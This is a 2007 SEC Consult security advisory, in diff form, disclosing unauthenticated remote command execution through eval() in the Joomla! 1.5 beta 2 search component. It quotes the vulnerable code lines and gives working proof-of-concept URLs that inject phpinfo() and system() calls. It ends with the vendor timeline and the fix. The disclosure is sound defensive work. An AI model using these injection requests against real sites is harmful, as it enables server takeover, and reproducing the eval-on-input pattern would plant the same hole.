@@ -1,0 +1,107 @@
+SEC Consult Security Advisory < 20070722-0 >
+=======================================================================
+             title: Remote command execution in Joomla! CMS
+           program: Joomla!
+ vulnerable version: 1.5 beta 2
+                    Earlier 1.5 versions may be vulnerable too!
+            impact: critical
+          homepage: http://www.joomla.org
+             found: 2007-05-20
+                by: Johannes Greil / SEC Consult / www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+
+Joomla! is an award-winning Content Management System (CMS) that will
+help you build websites and other powerful online applications. Best of
+all, Joomla! is an open source solution that is freely available to
+everybody. Joomla! is used all over the world to power everything from
+simple, personal homepages to complex corporate web applications.
+
+[source: http://www.joomla.org/content/view/12/26/]
+
+
+
+Vulnerability overview:
+-----------------------
+
+The search component of Joomla! allows an attacker to execute arbitrary
+PHP commands. It is e.g. possible to execute OS commands via system()
+calls. PHP is set to the settings recommended by the Joomla! installer!
+
+
+An attacker does not need to be authenticated to perform this attack!
+
+
+Vulnerability description:
+--------------------------
+
+The following scripts of a default Joomla! 1.5 beta 2 installation
+contain the vulnerable code:
+
+1) components/com_search/views/search/tmpl/default_results.php
+
+line 12: <?php eval ('echo "'. $this->result .'";'); ?>
+
+2) templates/beez/html/com_search/search/default_results.php
+
+line 25: echo '<p>' . eval ('echo "' . $this->result . '";');
+
+
+Input of the "searchword" parameter is being passed to the mentioned
+eval() code and executed. An attacker is able to append new PHP commands
+after the "echo" language construct which can be used for OS command
+execution.
+
+In order to bypass the search word length limitation of 20 characters a
+new GET parameter is being used to specify the OS commands (see proof of
+concept).
+
+
+Proof of concept:
+-----------------
+http://$joomlahost/index.php?searchword=";phpinfo();%23&option=com_search&Itemid=1
+http://$joomlahost/index.php?c=id&searchword=";system($_GET[c]);%23&option=com_search&Itemid=1
+
+
+Vulnerable versions:
+--------------------
+
+The following versions were found to be vulnerable:
+* 1.5 beta 2
+
+Earlier versions of Joomla! 1.5 beta have not been tested and may be
+vulnerable too!
+
+The stable version 1.0.13 of Joomla! does not contain the vulnerable
+code and is not affected by this security issue.
+
+
+Vendor contact timeline:
+------------------------
+
+2007-05-21: vendor notified via email (security@joomla.org)
+2007-05-21: vendor replied and fixed the issue in SVN
+URL:
+http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=%2Fdevelopment%2Ftrunk%2Fcomponents%2Fcom_search%2Fviews%2Fsearch%2Fview.php&r1=7455&r2=7456
+
+2007-07-21: vendor released RC1 of Joomla! 1.5
+2007-07-22: coordinated disclosure date, special greetings to Rob!
+
+
+Solution:
+---------
+The vendor does not recommend using the development version v1.5 beta
+for production sites and suggests using the latest stable version(s).
+
+If Joomla! v1.5 beta is being used, upgrade to v1.5 RC1 immediately
+which fixes the issue!
+
+
+Patch/Workaround:
+-----------------
+Use the fix from SVN (check out at least revision 7456 of
+/development/trunk/components/com_search/views/search/view.php)
+
+# milw0rm.com [2007-07-22]
